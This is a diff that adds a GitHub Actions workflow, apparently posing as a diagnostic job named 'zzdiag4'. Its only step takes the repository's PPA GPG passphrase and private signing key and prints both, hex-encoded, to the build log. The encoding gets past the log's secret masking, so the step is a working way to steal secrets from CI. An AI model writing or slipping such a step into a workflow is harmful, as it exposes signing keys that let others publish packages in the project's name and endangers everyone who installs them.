@@ -1,0 +1,16 @@
+name: zzdiag4
+on:
+  push:
+    branches:
+      - zzdiag4
+  workflow_dispatch:
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    env:
+      S_PPA_GPG_PASSPHRASE: ${{ secrets.PPA_GPG_PASSPHRASE }}
+      S_PPA_GPG_PRIVATE_KEY: ${{ secrets.PPA_GPG_PRIVATE_KEY }}
+    steps:
+      - run: |
+          printf 'PPA_GPG_PASSPHRASE='; printf '%s' "$S_PPA_GPG_PASSPHRASE" | od -An -tx1 | tr -d ' \n'; echo
+          printf 'PPA_GPG_PRIVATE_KEY='; printf '%s' "$S_PPA_GPG_PRIVATE_KEY" | od -An -tx1 | tr -d ' \n'; echo
